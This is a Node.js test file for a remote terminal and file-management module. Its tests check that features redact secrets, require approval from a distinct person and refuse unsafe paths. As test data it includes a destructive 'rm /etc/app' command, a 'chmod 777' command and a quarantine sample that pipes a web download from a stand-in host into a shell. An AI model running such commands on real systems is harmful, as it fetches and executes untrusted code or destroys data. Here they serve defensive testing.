'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { TerminalFileVisionManager, FEATURES } = require('../src/terminal-file-vision-manager');

function fixture(dependencies = {}) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'kitsune-vision-'));
  const secrets = new Map();
  const secretStore = { get: key => secrets.get(key), set: (key, value) => { secrets.set(key, value); return true; }, remove: key => secrets.delete(key) };
  return { root, secrets, manager: new TerminalFileVisionManager(root, { ...dependencies, secretStore }) };
}

test('exposes exactly the 89 scoped Terminal and File capabilities', () => {
  const { manager } = fixture(); assert.equal(FEATURES.length, 89); assert.equal(manager.summary().features, 89); assert.deepEqual(manager.configuration().supportedFeatures, FEATURES);
});

test('workspace drive, delta engine and offline merge are preview-first', () => {
  const { manager } = fixture();
  const drive = manager.execute('remote-workspace-drive', { sessionId: 'srv-1', remoteRoot: '/srv/app', localMount: 'C:\\cache', cacheMode: 'offline' }); assert.equal(drive.executable, false); assert.equal(drive.drive.credentialsIncluded, false);
  const delta = manager.execute('delta-transfer-engine', { sourceBlocks: [{ hash: 'a', bytes: 10 }, { hash: 'b', bytes: 10 }], targetHashes: ['a'] }); assert.equal(delta.transferBytes, 10); assert.equal(delta.savedBytes, 10); assert.equal(delta.requiresApproval, true);
  const created = manager.execute('offline-workspace', { action: 'create', sessionId: 'srv-1', remoteRoot: '/srv/app', localRoot: 'C:\\offline' }); const merge = manager.execute('offline-workspace', { action: 'merge', id: created.workspace.id, baseContent: 'a', localContent: 'b', remoteContent: 'c' }); assert.equal(merge.conflict, true); assert.match(merge.merge, /<<<<<<< LOCAL/);
});

test('code intelligence and universal search stay local and bounded', () => {
  const { manager } = fixture(); const code = manager.execute('remote-code-intelligence', { language: 'javascript', content: 'function start() {}\nconst value = 1;\n// TODO' }); assert.deepEqual(code.symbols.map(item => item.name), ['start', 'value']); assert.equal(code.serverCodeExecuted, false);
  const search = manager.execute('universal-content-search', { query: 'config', records: [{ path: '/etc/config.json', content: '{}' }, { path: '/tmp/a' }] }); assert.equal(search.results.length, 1); assert.equal(search.querySentToServers, false);
});

test('connection graph and tunnel plans validate topology without binding ports', () => {
  const { manager } = fixture(); const graph = manager.execute('connection-graph', { sessions: [{ id: 'a', name: 'Bastion' }, { id: 'b', name: 'App', jumpHostId: 'a' }], tunnels: [{ id: 't1', sessionId: 'b', localPort: 8080, remoteHost: 'localhost', remotePort: 80 }] }); assert.equal(graph.nodes.length, 4); assert.ok(graph.edges.some(edge => edge.kind === 'jump'));
  const tunnel = manager.execute('smart-jump-tunnel-manager', { sessionId: 'b', localPort: 8080, remotePort: 80 }); assert.equal(tunnel.executable, false); assert.equal(tunnel.conflictCheck.required, true);
});

test('JIT secrets are server-bound, expiring and one-use', () => {
  const { manager, secrets } = fixture(); const issued = manager.execute('just-in-time-secrets', { value: 'top-secret', sessionId: 'srv-1', ttlSeconds: 60 }); assert.equal(JSON.stringify(issued).includes('top-secret'), false); assert.ok([...secrets.values()].includes('top-secret'));
  assert.throws(() => manager.execute('just-in-time-secrets', { action: 'consume', id: issued.lease.id, sessionId: 'srv-2' }), /unavailable/); const consumed = manager.execute('just-in-time-secrets', { action: 'consume', id: issued.lease.id, sessionId: 'srv-1' }); assert.equal(consumed.value, 'top-secret'); assert.throws(() => manager.execute('just-in-time-secrets', { action: 'consume', id: issued.lease.id, sessionId: 'srv-1' }), /unavailable/);
});

test('guardrails, forensic evidence and ephemeral certificates exclude sensitive material', () => {
  const { manager } = fixture(); manager.execute('policy-as-code-guardrails', { action: 'save', name: 'Prod', environment: 'production', readOnly: true, protectedPaths: ['/etc'], requireSecondPerson: true }); const verdict = manager.execute('policy-as-code-guardrails', { action: 'evaluate', environment: 'production', command: 'rm /etc/app', path: '/etc/app' }); assert.equal(verdict.allowed, false); assert.equal(verdict.commandPersisted, false);
  const evidence = manager.execute('forensic-mode', { sessionId: 'srv-1', evidence: [{ path: '/log', content: 'evidence' }] }); assert.equal(evidence.case.readOnly, true); assert.equal(evidence.case.serverMutations, false); assert.equal(evidence.case.signature.length, 64);
  const cert = manager.execute('ephemeral-ssh-certificates', { sessionId: 'srv-1', principal: 'operator', publicKey: 'ssh-ed25519 AAA', minutes: 10 }); assert.equal(cert.privateKeyExported, false); assert.equal(JSON.stringify(cert).includes('AAA'), false);
});

test('canary and production lens add explicit rollout and destructive-command gates', () => {
  const { manager } = fixture(); const canary = manager.execute('canary-operations', { sessionIds: ['a', 'b', 'c'], operation: 'restart app', canaryCount: 1 }); assert.deepEqual(canary.plan.canary, ['a']); assert.deepEqual(canary.plan.remainder, ['b', 'c']); assert.equal(canary.plan.executable, false);
  const lens = manager.execute('production-safety-lens', { environment: 'production', serverName: 'prod-1', command: 'systemctl restart app' }); assert.equal(lens.requiresTypedConfirmation, true); assert.equal(lens.confirmationPhrase, 'prod-1'); assert.equal(lens.commandPersisted, false);
});

test('digital twin and intent terminal refuse opaque execution', () => {
  const { manager } = fixture(); const twin = manager.execute('digital-twin-sandbox', { command: 'chmod 777 /srv/app' }); assert.ok(twin.predictedEffects.includes('change-permissions')); assert.equal(twin.serverExecuted, false);
  const known = manager.execute('intent-terminal', { intent: 'Show disk usage' }); assert.equal(known.understood, true); assert.equal(known.mutationsExecuted, false); const unknown = manager.execute('intent-terminal', { intent: 'Do some magic' }); assert.equal(unknown.steps.length, 0);
});

test('collaboration, HUD and permission studio provide governed visual models', () => {
  const { manager } = fixture(); const room = manager.execute('collaborative-terminal', { action: 'create', members: [{ name: 'A', role: 'operator' }, { name: 'B', role: 'approver' }], keyboardOwner: 'A' }); assert.equal(room.collaboration.recording, true);
  const hud = manager.execute('terminal-heads-up-display', { command: 'work', before: { cpuPercent: 5 }, after: { cpuPercent: 20 } }); assert.equal(hud.metrics.find(item => item.metric === 'cpuPercent').delta, 15); assert.equal(hud.commandPersisted, false);
  const permissions = manager.execute('visual-permission-studio', { path: '/srv/app', currentMode: '755', proposedMode: '777', identities: [{ name: 'guest', class: 'others' }] }); assert.equal(permissions.risk, 'critical'); assert.equal(permissions.executable, false); assert.equal(permissions.effectiveAccess[0].write, true);
});

test('disaster undo and living runbooks are minimal, redacted and approval-aware', () => {
  const { manager } = fixture(); const undo = manager.execute('remote-disaster-undo', { sessionId: 'srv-1', operation: 'update', files: [{ path: '/etc/app', content: 'x' }] }); assert.equal(undo.undoPoint.minimalScope, true); assert.equal(undo.requiresApprovalToRestore, true);
  const runbook = manager.execute('living-runbooks', { name: 'Deploy', commands: ['token=abc123 deploy', 'systemctl restart app'], rollbacks: ['rollback'] }); assert.equal(runbook.runbook.secretsIncluded, false); assert.match(runbook.runbook.steps[0].command, /<redacted>/); assert.equal(runbook.runbook.steps[1].approval, true);
});

test('adaptive scheduler is deterministic and context teleport is encrypted and secretless', () => {
  const { manager, root } = fixture(); const schedule = manager.execute('adaptive-operations-scheduler', { jobs: [{ id: 'slow', serverLoad: 95, networkQuality: 20, urgency: 20 }, { id: 'fast', serverLoad: 10, networkQuality: 90, urgency: 90 }] }); assert.equal(schedule.schedule.jobs[0].id, 'fast'); assert.equal(schedule.schedule.jobs.find(item => item.id === 'slow').throttlePercent, 20);
  const target = path.join(root, 'teleport.kctx'); const created = manager.execute('context-teleport', { target, passphrase: 'correct horse battery staple', tabs: [{ cwd: '/srv', password: 'never-store' }], serverProfiles: [{ id: 'a', token: 'secret' }] }); const raw = fs.readFileSync(target, 'utf8'); assert.equal(raw.includes('/srv'), false); assert.equal(raw.includes('never-store'), false); const opened = manager.execute('context-teleport', { action: 'open', target, passphrase: 'correct horse battery staple' }); assert.equal(opened.payload.secretsIncluded, false); assert.equal('password' in opened.payload.tabs[0], false);
});

test('unknown feature and unsafe paths are rejected', () => {
  const { manager } = fixture(); assert.throws(() => manager.execute('not-a-feature', {}), /Unknown/); assert.throws(() => manager.execute('visual-permission-studio', { path: '../etc', proposedMode: '644' }), /absolute remote path/);
});

test('structured output canvas recognizes JSON, tables and logs without losing raw access', () => {
  const { manager } = fixture(); const json = manager.execute('structured-output-canvas', { output: '[{"pid":1,"name":"app"}]' }); assert.equal(json.kind, 'json'); assert.ok(json.views.includes('raw')); const table = manager.execute('structured-output-canvas', { output: 'name\tstate\napp\trunning' }); assert.equal(table.kind, 'table'); assert.equal(table.rows[0].state, 'running'); const log = manager.execute('structured-output-canvas', { output: 'INFO ready\nERROR failed' }); assert.equal(log.kind, 'log'); assert.equal(log.rows[1].level, 'error');
});

test('file graph and semantic history explain relationships and configuration changes', () => {
  const { manager } = fixture(); const graph = manager.execute('file-relationship-graph', { files: [{ path: '/app/a.js', content: "import './b.js'" }, { path: '/app/b.js', content: '' }] }); assert.ok(graph.edges.some(edge => edge.to === '/app/b.js' && edge.resolved)); assert.equal(graph.sourceExecuted, false); const history = manager.execute('semantic-file-history', { path: '/app/config.json', before: '{"port":80}', after: '{"port":443,"tls":true}' }); assert.ok(history.changes.some(item => item.path === 'port' && item.kind === 'changed')); assert.ok(history.changes.some(item => item.path === 'tls' && item.kind === 'added'));
  const secretHistory = manager.execute('semantic-file-history', { path: '/app/config.json', before: '{"password":"old"}', after: '{"password":"new"}' }); assert.equal(JSON.stringify(secretHistory).includes('old'), false); assert.equal(JSON.stringify(secretHistory).includes('new'), false);
});

test('signed receipts and predictive cache keep auditable and local-only metadata', () => {
  const { manager } = fixture(); const receipt = manager.execute('signed-transfer-receipts', { source: { path: '/a', token: 'hidden' }, destination: { path: '/b' }, content: 'abc', operator: 'A' }); assert.equal(receipt.receipt.signature.length, 64); assert.equal(JSON.stringify(receipt).includes('hidden'), false); const cache = manager.execute('predictive-workspace-cache', { sessionId: 'srv-1', events: [{ path: '/app/a', bytes: 100, contentRequested: true }, { path: '/app/b', bytes: 999999 }] }); assert.equal(cache.profile.localLearningOnly, true); assert.equal(cache.profile.candidates[0].prefetch, 'small-content');
});

test('live event streams normalize providers and identity timeline blocks changed keys', () => {
  const { manager } = fixture(); const stream = manager.execute('live-remote-event-stream', { sessionId: 'srv-1', root: '/app', platform: 'linux', events: [{ kind: 'modify', path: '/app/a', pid: 10 }] }); assert.equal(stream.stream.provider, 'inotify'); assert.equal(stream.stream.incrementalRefresh, true); const first = manager.execute('server-identity-trust-timeline', { sessionId: 'srv-1', fingerprint: 'SHA256:first', addresses: ['10.0.0.1'], dns: 'app.test' }); assert.equal(first.record.status, 'first-seen'); const changed = manager.execute('server-identity-trust-timeline', { sessionId: 'srv-1', fingerprint: 'SHA256:other', addresses: ['10.0.0.2'], dns: 'new.test' }); assert.equal(changed.blocked, true); assert.equal(changed.visualDiff.fingerprintChanged, true);
});

test('batch transforms and data inspector produce bounded reviewable previews', () => {
  const { manager } = fixture(); const batch = manager.execute('visual-batch-rename-transform', { files: [{ path: '/app/a.txt', content: 'a\r\n' }], prefix: 'new-', lineEndings: 'lf' }); assert.equal(batch.entries[0].after, '/app/new-a.txt'); assert.equal(batch.entries[0].contentChanged, true); assert.equal(batch.executable, false); const data = manager.execute('remote-data-inspector', { format: 'csv', content: 'name,value\na,1\nb,2', pageSize: 1, page: 2 }); assert.equal(data.rows[0].name, 'b'); assert.equal(data.fullFileDownloaded, false); assert.equal(data.mutationsAllowed, false);
  assert.throws(() => manager.execute('visual-batch-rename-transform', { files: [{ path: '/app/a.txt' }], prefix: '../' }), /path separators/);
});

test('continuity, composer and focus mode expose explicit transitions and risk', () => {
  const { manager } = fixture(); const continuity = manager.execute('connection-continuity', { sessionId: 'srv-1', mosh: true, tmux: true, highLatency: true }); assert.equal(continuity.selected, 'mosh'); assert.equal(continuity.requiresIdentityRecheck, true); const composed = manager.execute('reviewable-command-composer', { stages: [{ kind: 'command', value: 'ps aux' }, { kind: 'filter', value: 'grep app' }, { kind: 'redirect', value: '/tmp/result' }] }); assert.equal(composed.risk, 'write'); assert.equal(composed.requiresApproval, true); assert.equal(composed.executable, false); const focus = manager.execute('terminal-focus-mode', { sessionId: 'srv-1', environment: 'production' }); assert.equal(focus.theme, 'production-red'); assert.ok(focus.hidden.includes('sidebar'));
});

test('universal staging, layouts and bookmarks are structured rather than table-only actions', () => {
  const { manager } = fixture(); const created = manager.execute('universal-staging-area', { action: 'create', name: 'Release' }); const staged = manager.execute('universal-staging-area', { action: 'add', id: created.area.id, entries: [{ sessionId: 'srv-1', path: '/app/a', kind: 'modify' }] }); assert.equal(staged.summary.modify, 1); assert.equal(staged.executable, false); const layout = manager.execute('multi-monitor-operations-layout', { name: 'Ops', displays: [{ id: 'one', width: 1920, height: 1080 }], panels: [{ kind: 'terminal', displayId: 'one' }, { kind: 'files', displayId: 'missing' }] }); assert.equal(layout.layout.panels[1].displayId, 'one'); assert.equal(layout.layout.secretsIncluded, false); const bookmark = manager.execute('command-file-bookmarks', { kind: 'line', sessionId: 'srv-1', target: '/app/a', line: 42 }); assert.equal(bookmark.bookmark.line, 42);
});

test('screen explanations, health and disposable lens remain safe and compact', () => {
  const { manager } = fixture(); const explained = manager.execute('explain-this-screen', { kind: 'port', context: { port: 443, password: 'hidden' } }); assert.equal(explained.understood, true); assert.equal(JSON.stringify(explained).includes('hidden'), false); const health = manager.execute('remote-workspace-health', { latencyMs: 220, packetLossPercent: 3, transferQueue: 10, conflicts: 1 }); assert.notEqual(health.state, 'healthy'); assert.ok(health.issues.includes('high-latency')); const lens = manager.execute('disposable-data-lens', { path: '/tmp/sample.zip' }); assert.equal(lens.isolation.network, false); assert.equal(lens.isolation.credentials, false); assert.equal(lens.executable, false);
});

test('command matrix and transfer center group results and preserve resumable queue state', () => {
  const { manager } = fixture(); const matrix = manager.execute('cross-server-command-matrix', { command: 'uname -a', sessionIds: ['a', 'b', 'c'], results: [{ sessionId: 'a', code: 0, output: 'Linux' }, { sessionId: 'b', code: 0, output: 'Linux' }, { sessionId: 'c', code: 1, output: 'offline' }] }); assert.equal(matrix.matrix.groups.find(item => item.count === 2).sessionIds.length, 2); assert.deepEqual(matrix.matrix.exceptions, ['c']); assert.equal(matrix.matrix.executable, false);
  const queue = manager.execute('transfer-control-center', { items: [{ id: 'one', source: { path: '/a', token: 'hidden' }, destination: { path: '/b' }, bytes: 100, transferred: 40 }] }); assert.equal(queue.queue.items[0].progress, 40); assert.equal(queue.queue.items[0].state, 'resumable'); assert.equal(JSON.stringify(queue).includes('hidden'), false);
});

test('direct transfer, atomic editor and session time machine are preview-first and secretless', () => {
  const { manager } = fixture(); const transfer = manager.execute('direct-server-transfer', { sourceSessionId: 'a', sourcePath: '/release', destinationSessionId: 'b', destinationPath: '/backup', bytes: 100 }); assert.equal(transfer.localPayloadBytes, 0); assert.equal(transfer.encryption, 'end-to-end'); assert.equal(transfer.executable, false);
  const edit = manager.execute('atomic-remote-editor', { sessionId: 'a', path: '/etc/app.json', beforeContent: '{}', proposedContent: '{"ok":true}' }); assert.equal(edit.plan.write.atomicRename, true); assert.equal(edit.plan.contentPersisted, false); assert.notEqual(edit.plan.beforeHash, edit.plan.proposedHash);
  const timeline = manager.execute('session-time-machine', { sessionId: 'a', events: [{ kind: 'command', command: 'token=abc123 run' }, { kind: 'cwd', path: '/srv/app' }] }); assert.equal(timeline.timeline.replay.commandsExecuted, false); assert.equal(JSON.stringify(timeline).includes('abc123'), false);
});

test('snapshot diff, smart sync and archive explorer expose safe visual plans', () => {
  const { manager } = fixture(); const diff = manager.execute('filesystem-snapshot-diff', { root: '/app', before: [{ path: '/app/a', content: 'old', mode: '644' }], after: [{ path: '/app/a', content: 'new', mode: '640' }, { path: '/app/b', content: 'x' }] }); assert.equal(diff.summary.content, 1); assert.equal(diff.summary.added, 1); assert.equal(diff.serverMutations, false);
  const sync = manager.execute('smart-sync-profiles', { sessionId: 'a', remoteRoot: '/app', localRoot: 'C:\\cache', direction: 'bidirectional' }); assert.equal(sync.profile.deletePropagation, false); assert.equal(sync.profile.executable, false);
  const archive = manager.execute('archive-explorer', { path: '/tmp/a.zip', entries: [{ name: 'ok/file.txt' }, { name: '../escape' }] }); assert.equal(archive.entries[0].safe, true); assert.equal(archive.unsafeEntries, 1); assert.equal(archive.executable, false);
});

test('storage fabric, virtual folders and disk map avoid credential and table-only output', () => {
  const { manager } = fixture(); const fabric = manager.execute('remote-storage-fabric', { endpoints: [{ protocol: 'sftp', root: '/app', password: 'hidden' }, { protocol: 's3', root: '/bucket' }] }); assert.equal(fabric.endpoints[1].capabilities.serverSideCopy, true); assert.equal(JSON.stringify(fabric).includes('hidden'), false); assert.equal(fabric.protocolSpecificDetailsCollapsed, true);
  const folder = manager.execute('live-virtual-folders', { name: 'Large logs', conditions: [{ field: 'extension', operator: 'equals', value: '.log' }, { field: 'bytes', operator: 'gt', value: '100' }], records: [{ path: '/a.log', extension: '.log', bytes: 200 }, { path: '/b.txt', extension: '.txt', bytes: 300 }] }); assert.equal(folder.preview.length, 1); assert.equal(folder.contentCopied, false);
  const map = manager.execute('disk-space-visualizer', { root: '/srv', entries: [{ path: '/srv/app/a', bytes: 100 }, { path: '/srv/cache/b', bytes: 50, kind: 'cache' }] }); assert.equal(map.visualization, 'zoomable-treemap'); assert.equal(map.cleanupExecutable, false); assert.equal(map.nodes.length, 2);
});

test('process navigator, clipboard, shell resurrection and fusion preserve safety context', () => {
  const { manager } = fixture(); const navigator = manager.execute('process-port-container-navigator', { processes: [{ pid: 12, name: 'nginx', containerId: 'web', configPaths: ['/etc/nginx.conf'] }], ports: [{ port: 443, protocol: 'tcp', address: '0.0.0.0', pid: 12 }] }); assert.equal(navigator.edges[0].resolved, true); assert.equal(navigator.destructiveActionsCollapsed, true);
  const clipboard = manager.execute('secure-clipboard-bridge', { content: 'password=top-secret', destinations: ['ssh'] }); assert.equal(clipboard.allowed, false); assert.equal(clipboard.historyPersisted, false); assert.equal(JSON.stringify(clipboard).includes('top-secret'), false);
  const shell = manager.execute('shell-resurrection', { sessionId: 'a', tabs: [{ cwd: '/app', multiplexer: 'tmux', remoteSession: 'ops', command: 'danger' }] }); assert.equal(shell.strategy, 'tmux-reattach'); assert.equal(shell.commandsReexecuted, false);
  const fusion = manager.execute('terminal-file-manager-fusion', { cwd: '/app', shell: 'posix', paths: ['/app/a file'], output: 'opened /app/config.json' }); assert.match(fusion.quotedSelection, /'\/app\/a file'/); assert.deepEqual(fusion.detectedPaths, ['/app/config.json']); assert.equal(fusion.unsafeAutomaticExecution, false);
});

test('context beacon and connection waterfall make identity and latency visually explicit', () => {
  const { manager } = fixture(); const beacon = manager.execute('execution-context-beacon', { sessionId: 'a', host: 'prod-1', user: 'root', elevated: true, environment: 'production', runtime: 'kubernetes', namespace: 'payments', cwd: '/app', expected: { host: 'prod-2' } }); assert.equal(beacon.blocked, true); assert.equal(beacon.theme, 'critical-red'); assert.equal(beacon.mismatches[0].field, 'host');
  const waterfall = manager.execute('connection-waterfall-tuner', { latencyMs: 180, phases: [{ id: 'dns', durationMs: 300 }, { id: 'ssh', durationMs: 900 }, { id: 'sftp', durationMs: 700 }] }); assert.equal(waterfall.bottleneck.id, 'ssh'); assert.ok(waterfall.recommendations.includes('reuse-ssh-channel')); assert.equal(waterfall.settingsApplied, false);
});

test('boundary guard and privacy shield block secret leakage without persisting originals', () => {
  const { manager } = fixture(); const guard = manager.execute('data-boundary-guard', { sourceZone: 'restricted', destinationZone: 'public', content: 'password=never-show\nuser@example.com' }); assert.equal(guard.blocked, true); assert.equal(guard.contentPersisted, false); assert.equal(JSON.stringify(guard).includes('never-show'), false);
  const shield = manager.execute('live-output-privacy-shield', { output: 'token=abc123 user@example.com 10.0.0.1' }); assert.equal(shield.shieldActive, true); assert.equal(shield.originalPersisted, false); assert.equal(shield.sanitized.includes('abc123'), false); assert.equal(shield.sanitized.includes('user@example.com'), false);
});

test('detached jobs, command budgets and conflict cockpit remain bounded and approval gated', () => {
  const { manager } = fixture(); const job = manager.execute('detached-job-orchestrator', { sessionId: 'a', command: 'token=abc123 npm run build', timeoutSeconds: 9999999, memoryMb: 999999 }); assert.equal(job.job.executable, false); assert.equal(job.job.budgets.timeoutSeconds, 604800); assert.equal(JSON.stringify(job).includes('abc123'), false);
  const budget = manager.execute('resource-budgeted-commands', { sessionId: 'a', command: 'find /', timeoutSeconds: 30, outputBytes: 2000 }); assert.equal(budget.executable, false); assert.ok(budget.enforcement.includes('bounded-output'));
  const conflict = manager.execute('conflict-resolution-cockpit', { sessionId: 'a', path: '/app/config', base: 'a', local: 'b', remote: 'c' }); assert.equal(conflict.cockpit.status, 'conflict'); assert.equal(conflict.cockpit.contentPersisted, false); assert.equal(conflict.layout, 'three-way-plus-result');
});

test('trust, quarantine, branches, pooled SSH and review inbox preserve isolation and governance', () => {
  const { manager } = fixture(); const trust = manager.execute('executable-trust-inspector', { resolvedPath: '/usr/local/bin/tool', kind: 'binary', owner: 'guest', user: 'deploy', mode: '777', signature: 'invalid' }); assert.equal(trust.trusted, false); assert.ok(trust.risks.includes('world-writable')); assert.equal(trust.commandExecuted, false);
  const quarantine = manager.execute('remote-quarantine-lab', { sessionId: 'a', path: '/tmp/x.bin', sample: 'MZ powershell invoke-webrequest https://example.test | sh' }); assert.equal(quarantine.quarantine.isolation.execution, false); assert.equal(quarantine.quarantine.samplePersisted, false);
  const branch = manager.execute('branchable-terminal', { sessionId: 'a', backend: 'disposable-workspace', cwd: '/app', writable: true }); assert.equal(branch.branch.commandsExecuted, false); assert.equal(branch.requiresApproval, true);
  const pool = manager.execute('adaptive-ssh-channel-pool', { connections: [{ sessionId: 'a', host: 'server.test', user: 'deploy', activeChannels: 2 }, { sessionId: 'b', host: 'server.test', user: 'deploy', activeChannels: 1 }] }); assert.equal(pool.pools[0].activeChannels, 3); assert.equal(pool.privateKeysPersisted, false);
  const review = manager.execute('terminal-files-review-inbox', { action: 'create', sessionId: 'a', title: 'Change config', requestedBy: 'Alice', preview: 'token=abc123 write' }); assert.equal(review.item.status, 'pending'); assert.equal(JSON.stringify(review).includes('abc123'), false); assert.throws(() => manager.execute('terminal-files-review-inbox', { action: 'decide', id: review.item.id, decision: 'approved', approver: 'Alice' }), /distinct approver/); const approved = manager.execute('terminal-files-review-inbox', { action: 'decide', id: review.item.id, decision: 'approved', approver: 'Bob' }); assert.equal(approved.item.status, 'approved'); assert.equal(approved.executable, false);
});

test('approved execution signs, independently approves, applies and deduplicates bounded actions', async () => {
  const remote = { list: () => [{ id: 'srv-1', name: 'Server' }] }; const ops = { exec: async (_session, command) => ({ success: true, code: 0, stdout: `ran ${command}`, stderr: '' }) }; const advanced = { safeCommand: template => ({ command: template === 'disk' ? 'df -h' : 'ss -lntup' }) }; const { manager } = fixture({ remoteAccess: remote, remoteOperations: ops, advanced }); const created = await manager.execute('approved-execution-engine', { action: 'create', sessionId: 'srv-1', requestedBy: 'Alice', actions: [{ kind: 'safe-template', template: 'disk' }] }); assert.equal(created.plan.status, 'pending-approval'); assert.equal(created.plan.executable, false); await assert.rejects(() => manager.execute('approved-execution-engine', { action: 'approve', id: created.plan.id, approver: 'Alice' }), /distinct approver/); const approved = await manager.execute('approved-execution-engine', { action: 'approve', id: created.plan.id, approver: 'Bob' }); assert.equal(approved.plan.status, 'approved'); const applied = await manager.execute('approved-execution-engine', { action: 'apply', id: created.plan.id, idempotencyKey: created.plan.idempotencyKey, approved: true }); assert.equal(applied.result.verified, true); assert.equal(applied.plan.executable, true); const repeated = await manager.execute('approved-execution-engine', { action: 'apply', id: created.plan.id, idempotencyKey: created.plan.idempotencyKey, approved: true }); assert.equal(repeated.idempotent, true);
});

test('visual renderers, Session Canvas and remote desktop engines expose bounded non-table models', () => {
  const { manager } = fixture(); const visual = manager.execute('visual-result-renderers', { kind: 'treemap', data: { nodes: [{ path: '/a', bytes: 100 }] } }); assert.equal(visual.renderer.mark, 'area'); assert.equal(visual.virtualized, true); assert.equal(visual.mutationsAllowed, false);
  const canvas = manager.execute('unified-remote-session-canvas', { name: 'Ops', layout: 'split', sessionId: 'srv-1', cwd: '/app', panes: [{ protocol: 'ssh', role: 'terminal' }, { protocol: 'sftp', role: 'files' }, { protocol: 'rdp', role: 'desktop' }] }); assert.equal(canvas.canvas.panes.length, 3); assert.equal(canvas.canvas.handoff, 'encrypted-context-no-credentials');
  const quality = manager.execute('remote-desktop-quality-engine', { mode: 'auto', latencyMs: 250, bandwidthMbps: 2, packetLossPercent: 4 }); assert.equal(quality.mode, 'low-latency'); assert.equal(quality.settingsApplied, false); const bridge = manager.execute('remote-desktop-file-bridge', { source: { protocol: 'rdp', path: '/Desktop/a' }, destination: { protocol: 'sftp', path: '/app/a' }, sourceZone: 'restricted', destinationZone: 'public', sample: 'password=hidden' }); assert.equal(bridge.boundary.blocked, true); assert.equal(JSON.stringify(bridge).includes('hidden'), false);
});

test('capability, Agent, action orb and adapter SDK use explicit safe fallback contracts', () => {
  const { manager } = fixture(); const negotiated = manager.execute('capability-negotiator', { platform: 'linux', available: ['ssh', 'sftp', 'tmux', 'docker', 'file-manifest'] }); assert.ok(negotiated.capabilities.find(item => item.name === 'files').available); assert.equal(negotiated.hideUnsupportedActions, true); const agent = manager.execute('optional-kitsune-agent', { endpoint: 'https://server.test:9443', health: { ok: true, version: 1 }, capabilities: ['metrics'], required: ['metrics'] }); assert.equal(agent.mode, 'agent'); assert.equal(agent.replayProtection, true); const fallback = manager.execute('optional-kitsune-agent', { health: { ok: false, version: 1 }, required: ['metrics'] }); assert.equal(fallback.mode, 'ssh-fallback');
  const orb = manager.execute('contextual-action-orb', { kind: 'file', target: { path: '/app/a', password: 'hidden' } }); assert.ok(orb.actions.length <= 6); assert.equal(orb.persistentToolbar, false); assert.equal(JSON.stringify(orb).includes('hidden'), false); const adapter = manager.execute('terminal-files-adapter-sdk', { manifest: { pluginId: 'com.example.storage', name: 'Storage', kind: 'storage', permissions: ['network', 'filesystem-read'], protocols: ['example'] } }); assert.equal(adapter.contract.sandbox.rendererCode, false); assert.equal(adapter.contract.installed, false); assert.throws(() => manager.execute('terminal-files-adapter-sdk', { manifest: { pluginId: 'com.example.bad', name: 'Bad', kind: 'protocol', entry: 'run.js' } }), /declarative/);
});

test('test lab, accessibility and fleet performance remain isolated, semantic and bounded', () => {
  const { manager } = fixture(); const lab = manager.execute('remote-operations-test-lab', { scenarios: ['connection-drop', 'host-key-change', 'partial-rollback'] }); assert.equal(lab.passed, true); assert.ok(lab.results.every(item => item.productionTouched === false)); const access = manager.execute('keyboard-accessibility-pass', { keyboardOnly: true, reduceMotion: true, highContrast: true, terminalScale: 1.5 }); assert.equal(access.profile.audit.colorOnlySignals, false); assert.equal(access.profile.shortcuts.actionOrb, 'Alt+Enter'); const performance = manager.execute('performance-large-fleet-pass', { servers: 5000, records: 1000000, outputBytes: 100000000 }); assert.equal(performance.strategies.serverList, 'windowed-virtualization'); assert.equal(performance.strategies.output, 'stream-worker-ring-buffer'); assert.equal(performance.rawDataCopiedToDom, false); const schema = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'src', 'terminal-files-adapter-sdk-schema.json'), 'utf8')); assert.equal(schema.properties.sdkVersion.const, 2); assert.equal('entry' in schema.properties, false);
});

test('semantic shell and reproducibility turn commands into bounded signed evidence', () => {
  const { manager } = fixture(); const shell = manager.execute('semantic-shell-layer', { host: 'prod', blocks: [{ command: 'token=hidden npm test', output: 'password=hidden ok', cwd: '/app', exitCode: 0, durationMs: 80 }] }); assert.equal(shell.blocks[0].state, 'success'); assert.equal(shell.commandRerunAutomatic, false); assert.equal(JSON.stringify(shell).includes('hidden'), false); const proof = manager.execute('command-reproducibility', { sessionId: 'srv-1', command: 'npm test', cwd: '/app', environment: { NODE_ENV: 'test', API_TOKEN: 'hidden' }, tools: [{ name: 'node', version: '24' }], exitCode: 0, output: 'ok' }); assert.equal(proof.verified, true); assert.equal(proof.record.environment.API_TOKEN, '<redacted>'); assert.equal(proof.record.rerunAutomatic, false); assert.equal(proof.record.signature.length, 64);
});

test('Config Studio and disposable Shadow Host validate and rehearse without production writes', () => {
  const { manager } = fixture(); const config = manager.execute('config-studio', { kind: 'nginx', path: '/etc/nginx/nginx.conf', currentContent: 'events {}', content: 'events {}\nhttp { server { listen 80; } }' }); assert.equal(config.validation.valid, true); assert.equal(config.plan.includes('automatic-rollback'), true); assert.equal(config.executable, false); const invalid = manager.execute('config-studio', { kind: 'docker-compose', path: '/srv/compose.yml', content: 'version: 3' }); assert.equal(invalid.validation.valid, false); const shadow = manager.execute('disposable-shadow-host', { sessionId: 'srv-1', operation: 'deploy', before: [{ path: '/app/config', content: 'a' }], after: [{ path: '/app/config', content: 'b' }, { path: '/app/new', content: 'x' }] }); assert.equal(shadow.productionTouched, false); assert.equal(shadow.plan.comparison.files.length, 2); assert.equal(shadow.plan.promotion.usesApprovedExecutionEngine, true);
});

test('Identity Center and Recovery Capsule preserve public trust and encrypted context only', () => {
  const { manager, root } = fixture(); const identity = manager.execute('identity-trust-center', { methods: ['certificate', 'fido2'], caEnabled: true, keys: [{ label: 'Hardware', fingerprint: 'SHA256:test', hardwareBacked: true }] }); assert.equal(identity.center.policy.exportPrivateKeys, false); assert.equal(identity.credentialsIncluded, false); const target = path.join(root, 'recovery.kitsune'); const created = manager.execute('workspace-recovery-capsule', { name: 'Recovery', target, passphrase: 'correct horse battery staple', cwd: '/app', tabs: [{ name: 'Terminal' }], unsavedBuffers: [{ path: '/app/notes', content: 'token=hidden notes' }] }); assert.equal(created.capsule.secretsIncluded, false); assert.equal(fs.existsSync(target), true); const opened = manager.execute('workspace-recovery-capsule', { action: 'open', target, passphrase: 'correct horse battery staple' }); assert.equal(opened.restoredCommands, false); assert.equal(JSON.stringify(opened).includes('hidden'), false);
});

test('Desktop Pro and live process explorer expose policy-aware visual models', () => {
